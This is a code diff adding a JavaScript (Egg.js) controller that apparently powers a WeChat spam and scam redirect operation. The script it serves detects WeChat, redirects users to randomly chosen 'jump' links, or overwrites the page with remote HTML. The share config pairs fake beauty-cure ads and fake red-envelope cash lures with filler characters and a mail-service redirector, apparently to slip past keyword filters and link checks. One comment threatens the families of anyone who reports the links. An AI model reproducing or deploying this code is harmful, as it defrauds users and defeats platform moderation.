@@ -1,0 +1,151 @@
+'use strict';
+
+const Controller = require('egg').Controller;
+// const rds = require('../../data/302');
+class BmdLbController extends Controller {
+    async index() {
+
+        const {
+            ctx,
+            service,
+            app
+        } = this;
+
+        await service.refer.check();
+
+        const key = `2:gzh:wx6797180ed00efd71:024ketch.com:playing_link`;
+        let playing_link = await app.redis.srandmember(key, 1);
+        const now = parseInt(Date.now() / 1000);
+
+        playing_link = service.url.addParam(playing_link, {
+            now
+        });
+
+        ctx.set({
+            'content-type': "application/x-javascript"
+        });
+
+        const data = `
+            var bxTitle = '' 
+            function _getParam(name) {
+            return location.href.match(new RegExp('[?&]' + name + '=([^?&#]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
+            }
+            var ua = navigator.userAgent.toLowerCase();
+              if (/micromessenger/.test(ua)) {
+                if(_getParam('from') && _getParam('from').indexOf('document') == -1){
+                    if (top != window || !document.body) {
+                      top.location.href = '${playing_link}';
+                    } else {
+                      var a = document.createElement('a');
+                      a.href = '${playing_link}';
+                      a.rel = 'noreferrer';
+                      a.click();
+                    }
+                  }else{
+                    var _lay=document.createElement('div');_lay.setAttribute('style','width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;');_lay.innerHTML='<div style="color:black;text-align:center;font-size:1.3em">loading...</div>';if(document.body)document.body.appendChild(_lay);document.title="正在打开...";var xhr=new XMLHttpRequest;var html=null;function getParam(name,url){var r=new RegExp('(\?|#|&)'+name+'=(.*?)(#|&|$)');var m=(url||location.href).match(r);return(m?m[2]:'')}function render(){var a=document.open("text/html","replace");a.write(html);a.close()}xhr.onload=function(){html=xhr.responseText;var delay=0;if(delay>0)setTimeout("render()",delay*1000);else render()};xhr.open("GET","https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/bmdlb/s.html?t="+Date.now(),!0);xhr.send();
+                }
+            }`
+
+        ctx.body = data;
+
+    }
+
+    async info() {
+
+        const {
+            ctx,
+            service,
+            app
+        } = this;
+        ctx.set({
+            'content-type': "application/x-javascript"
+        });
+        //裂变取024跳板
+
+        const jump_link_key = `2:gzh:wx6797180ed00efd71:024ketch.com:jump_link`;
+        const jump_link_pyq_key = `2:gzh:wx6797180ed00efd71:024ketch.com:jump_link_pyq`;
+
+        const jump_link_key_bx = `1:gzh:wx6797180ed00efd71:05ez.com:jump_link`
+        const jump_link_pyq_key_bx = `1:gzh:wx6797180ed00efd71:05ez.com:jump_link_pyq`;
+        const rdKey = '2:gzh:wx6797180ed00efd71:024ketch.com:302'
+
+        let jump_link = await app.redis.srandmember(jump_link_key, 1);
+        let jump_link_pyq = await app.redis.srandmember(jump_link_pyq_key, 1);
+
+        let jump_link_pyq_bx = await app.redis.srandmember(jump_link_pyq_key_bx, 1);
+        let jump_link_bx = await app.redis.srandmember(jump_link_key_bx, 1);
+
+        let rd = await app.redis.srandmember(rdKey, 1);
+
+        const spam = service.url.getSpm();
+        jump_link = service.url.addParam(jump_link, {}).replace('{spam}', spam)
+
+        jump_link_pyq = service.url.addParam(jump_link_pyq, {}).replace('{spam}', spam)
+
+        if (rd.length > 0) {
+            rd = rd[0];
+            if (jump_link.indexOf('.com/') !== -1) {
+                jump_link = service.url.replaceUrl('http://url.qmail.com/cgi-bin/safejmp?action=check_link&url={encodeUrl}', jump_link);
+            }
+
+            if (jump_link_pyq.indexOf('.com/') !== -1) {
+                jump_link_pyq = service.url.replaceUrl('http://url.qmail.com/cgi-bin/safejmp?action=check_link&url={encodeUrl}', jump_link_pyq);
+            }
+        }
+
+        let jfs = false;
+        const data = {
+            "注意": "举报跳板死全家",
+            "ad": {
+                //"app_url": rd.replace('{encodeUrl}', encodeURIComponent(jump_link)),
+                "app_url": jump_link_bx,
+                "timeline_url": jump_link_pyq_bx,
+                "desc": '㊙️急{fuck}速{fuck}祛{fuck}斑 美{fuck}白 平{fuck}皱{fuck}纹🔥祛{fuck}痘{fuck}印🔥无斑点{fuck}一招就搞{fuck}定，让{fuck}您水{fuck}嫩{fuck}年{fuck}轻18岁！🎉',
+                "img": 'https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/qb2.jpeg',
+                "title": ""
+            },
+            "attached": {
+                "case": "hun-hb",
+                "signmode": "jsb",
+                "back_api": "https://akqgyc.com/backup/args/xj_back.php",
+                "ad_share": {
+                    "pyq": [0, 1],
+                    "qun": [0, 0, 0, 0]
+                },
+                "timeline_ad": true,
+                "needWhite": true,
+                "group_ad": true,
+                jfs
+            },
+            "cnzz": "",
+            "hm": "46ea4995fb6116f9430b8379f5c18d8c",
+            "to_timeline": {
+                //"img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/lzl_s.jpeg",
+                "img": "http://butuyu.oss-cn-hangzhou.aliyuncs.com/Img_hb/voice.jpg",
+                "title": "20\"",
+                "link": jump_link_pyq,
+                "desc": ""
+            },
+            "to_group": {
+                "link": jump_link,
+                //"img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/qun.png",
+                //"img": 'https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/hong.png',
+                //"img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/lzl_s.jpeg",
+                //"title": "💎见{fuck}证{fuck}女{fuck}神{fuck}林{fuck}志{fuck}玲{fuck}新{fuck}婚{fuck}💎我{fuck}已{fuck}分{fuck}到{fuck}喜{fuck}钱{fuck}￥{fuck}{money}🎉！",
+                //"desc": "见{fuck}证{fuck}幸{fuck}福{fuck}，分{fuck}享{fuck}喜{fuck}悦",
+                // "title": "邀{fuck}请{fuck}你{fuck}加{fuck}入{fuck}群{fuck}聊",
+                // "desc": "邀{fuck}请{fuck}你{fuck}加{fuck}入{fuck}6{fuck}月{fuck}2{fuck}1{fuck}日{fuck}'{fuck}婚{fuck}宴{fuck}贵{fuck}宾{fuck}群{fuck}',共{fuck}有{fuck}9{fuck}位{fuck}共{fuck}同{fuck}好{fuck}友,进{fuck}群{fuck}查{fuck}看{fuck}详{fuck}情{fuck}",
+                //"desc": "庆{fuck}祝{fuck}5{fuck}G{fuck}上{fuck}市{fuck}🎉!我{fuck}已{fuck}抢{fuck}到{fuck}{money}{fuck}元！点{fuck}击{fuck}领{fuck}取>>"
+
+                "title": "",
+                "img": "http://butuyu.oss-cn-hangzhou.aliyuncs.com/Img_hb/voice.jpg",
+                "desc": "20\"",
+            }
+        }
+        ctx.body = `
+        window.data = ${JSON.stringify(data)}
+        `
+    }
+}
+
+module.exports = BmdLbController;
